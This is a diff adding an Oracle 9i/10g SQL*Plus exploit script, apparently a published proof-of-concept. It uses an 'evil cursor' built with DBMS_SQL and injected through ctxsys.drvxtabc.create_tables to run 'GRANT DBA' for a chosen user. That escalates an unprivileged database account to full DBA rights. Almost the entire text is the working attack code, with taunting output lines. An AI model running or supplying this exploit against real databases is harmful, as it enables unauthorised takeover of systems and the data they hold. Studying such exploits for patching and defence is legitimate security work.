@@ -1,0 +1,36 @@
+-- 
+-- ctxsys.drvxtabc.create_tablesV2.sql
+--
+--
+-- Oracle ctxsys.drvxtabc.create_tables exploit (9i/10g)
+-- Evil cursor technique
+--
+-- Grant dba permission to unprivileged user
+-- 
+-- 
+-- REF: http://www.google.it/search?q=ctxsys.drvxtabc.create_tables
+-- 
+-- AUTHOR: Andrea "bunker" Purificato
+-- http://rawlab.mindcreations.com
+--
+--
+set serveroutput on;
+prompt [+] ctxsys-drvxtabc-create_tablesV2.sql exploit
+prompt [+] by Andrea "bunker" Purificato - http://rawlab.mindcreations.com
+prompt [+] 37F1 A7A1 BB94 89DB A920 3105 9F74 7349 AF4C BFA2
+prompt 
+undefine the_user;
+accept the_user char prompt 'Target username (default TEST): ' default 'TEST';
+prompt
+prompt [-] Creating evil cursor...
+
+DECLARE
+MYC NUMBER;
+BEGIN
+MYC := DBMS_SQL.OPEN_CURSOR;
+DBMS_SQL.PARSE(MYC,'declare pragma autonomous_transaction;begin execute immediate ''GRANT DBA TO &the_user'';commit;end;',0);
+ctxsys.drvxtabc.create_tables(''||user||'"."x" as select * from dual where dbms_sql.execute('||MYC||')=0--','x',2);
+END;
+/
+
+prompt [-] YOU GOT THE POWAH!!
